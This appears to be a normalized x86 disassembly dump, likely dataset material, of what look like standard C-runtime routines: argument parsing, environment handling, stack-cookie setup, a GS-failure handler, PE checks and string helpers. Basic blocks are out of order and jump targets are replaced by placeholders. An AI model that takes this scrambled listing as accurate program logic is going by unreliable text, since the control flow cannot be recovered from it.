mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_200de24
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_200de24
pop ecx
test eax eax
je r-xdata
call sub_200de24
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_200a60a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_2003c3a
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_200a470
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_200b534
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_200a470
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_200a6c5
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_200b534
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_200b534
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_20081d0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_20016b0
pop ecx
mov [ ebp - 0x4 ] ebx
sub_200a7fc
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_200a822
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_200a848
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_200a8de
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_200bad0
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_200bad0
pop ecx
sub_200a9e4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_200788d
push eax
call sub_200bcbf
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_2006998
add eax 0x20
cmp esi eax
jne r-xdata
call sub_2006998
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_200b534
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_200aa80
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_200319d
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_200aab4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_2003ff8
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_2003ff8
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_200de3c
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_2003f7d
mov [ esi ] eax
add esi 0x4
push esi
call sub_2003f7d
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_200b5c5
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_200b5c5
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_2003f7d
pop ecx
mov [ rw-data ] eax
sub_200ab70
push esi
push 0x4
push 0x20
call sub_200b579
mov esi eax
push esi
call sub_2003f7d
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_200ab9f
push 0xc
push r--data
call sub_200625c
call sub_2002f01
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_200aab4
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200abd5
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
sub_200abf2
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_2003f7d
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_200ac20
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_200ac60
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_200acb0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_20062c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_200ac20
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_200ac60
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_200add5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_200ae19
push 0x20
push r--data
call sub_200625c
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_20041cb
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_20062a1
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_200add5
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_200311b
mov [ ebp - 0x1c ] 0x1
push eax
call sub_2003ff8
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_20047ce
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_2004766
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_2005765
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_2003fef
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200af8d
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_200aff6
push 0x10
push r--data
call sub_200625c
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
sub_200b056
push 0x10
push r--data
call sub_200625c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047ce
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2004766
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_20062a1
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_200d189
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_20047ce
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_200d112
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b12d
mov eax [ ebp - 0x1c ]
call sub_20047e1
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_200b140
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_200b1f0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_200b2b0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_200b338
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_200d925
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2002d91
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_200d96e
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_20016b0
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_2007940
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_2008535
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_200178d
pop ecx
cmp eax ebx
je r-xdata
call sub_200db30
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_200b4f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200b338
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200b534
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_200178d
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_200b579
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200dfff
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_200b5c5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200227f
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_200b613
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
